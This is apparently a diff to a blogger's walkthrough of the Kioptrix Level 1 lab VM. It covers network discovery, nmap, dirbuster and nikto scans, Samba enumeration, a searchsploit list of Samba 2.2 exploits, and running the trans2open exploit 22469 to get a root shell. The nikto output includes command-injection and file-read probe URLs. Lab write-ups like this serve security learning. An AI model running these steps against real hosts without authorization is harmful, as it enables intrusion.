@@ -27,7 +27,7 @@ netdiscover -i eth0
 ```
 -i device: your network device (interface)  
 
-![image](/images/netdiscover.png "screenshot of netdiscover")
+![image](/images/kioptrix1_netdiscover.png "screenshot of netdiscover")
 
 So the target IP address is `192.168.119.254`
  
@@ -93,6 +93,12 @@ interesint 80, 443 for webserver, tcp 139 samba
 
 SMB a communication protocal for providing shared access to files, printers, and serial ports between nodes on a network
 
+```
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+```
+
 ## UDP Scan
 ```
 nmap --top-ports 1000 -sU -Pn --stats-every 3m --max-retries 1 -T3 192.168.0.22
@@ -133,3 +139,154 @@ port 80 and 443
 * check out https://
 
 ### Directory Scan
+```
+dirbuster
+```
+some wordlist stored in `/usr/share/wordlists/dirbuster`
+Also download some big wordlist, google `dirbuster wordlist`
+I actually not found through google, its in githubrepo https://github.com/digination/dirbuster-ng
+
+remove `manual` from the wordlist, there are many php manual page, waste of time, but let me try
+![image](/images/kioptrix1_dirbuster.png "screenshot of dirbuster")
+
+nothing interesting
+
+```
+nikto -h 192.168.0.22
+```
+-h -host
+
+```
+---------------------------------------------------------------------------
++ Target IP:          192.168.0.22
++ Target Hostname:    192.168.0.22
++ Target Port:        80
++ Start Time:         2021-03-09 21:53:34 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
++ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.
++ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
++ OSVDB-27487: Apache is vulnerable to XSS via the Expect header
++ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
++ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
++ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
++ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
++ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
++ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).
++ OSVDB-3268: /manual/: Directory indexing found.
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ OSVDB-3092: /test.php: This might be interesting...
++ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
++ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
++ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
++ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
++ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
++ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
++ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
++ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
++ /shell?cat+/etc/hosts: A backdoor was identified.
++ 8724 requests: 0 error(s) and 30 item(s) reported on remote host
++ End Time:           2021-03-09 21:53:58 (GMT-5) (24 seconds)
+---------------------------------------------------------------------------
+
+```
+
+If there's PUT or DELETE method, that would be interesting
+
+scan for https: `nikto -h 192.168.0.22:443`
+
+
+## SMB Enumeration
+
+add some smb configuration `tc/samba/smb.conf
+`
+``` notgood
+[global]
+client use spnego = no
+client ntlmv2 auth = no
+```
+deprecated.. use the following
+
+SPNEGO is used when a client application wants to authenticate to a remote server, but neither end is sure what authentication protocols the other supports.
+
+not sure why I need those
+
+```
+enum4linux 192.168.0.22
+```
+
+Enum4linux is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar functionality to enum.exe formerly available from www.bindview.com.
+
+
+```
+===================================== 
+|    Session Check on 192.168.0.22    |
+ ===================================== 
+[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
+
+```
+
+resolve the issue by adding this to smb.conf:
+```
+client min protocol = NT1
+```
+
+
+```
+ ====================================== 
+|    OS information on 192.168.0.22    |
+ ====================================== 
+Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+[+] Got OS info for 192.168.0.22 from smbclient: 
+[+] Got OS info for 192.168.0.22 from srvinfo:
+        KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
+        platform_id     :       500
+        os version      :       4.5
+        server type     :       0x9a03
+
+```
+
+use metasploit to detect smb version
+```
+auxiliary/scanner/smb/smb_version
+set rhosts 192.168.0.22
+show options
+exploit
+```
+samba version is `Samba 2.2.1a`
+
+```
+searchsploit samba 2.2
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+Samba 2.0.x/2.2 - Arbitrary File Creation                                          | unix/remote/20968.txt
+Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                       | osx/remote/9924.rb
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                         | unix/remote/22468.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                         | unix/remote/22469.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                         | unix/remote/22470.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                         | unix/remote/22471.txt
+Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)                               | linux/remote/9936.rb
+Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow            | unix/remote/22356.c
+Samba 2.2.x - Remote Buffer Overflow                                               | linux/remote/7.pl
+---------------------------------------------------------------------------------- ---------------------------------
+```
+
+goto https://www.exploit-db.com/search, search for trans2open
+
+Tried some exploits, https://www.exploit-db.com/exploits/22469 this one works and I successfully get the shell
+
+```
+./22469 -t 192.168.0.22 
+```
+
+![image](/images/kioptrix1_root.png "screenshot of dirbuster")
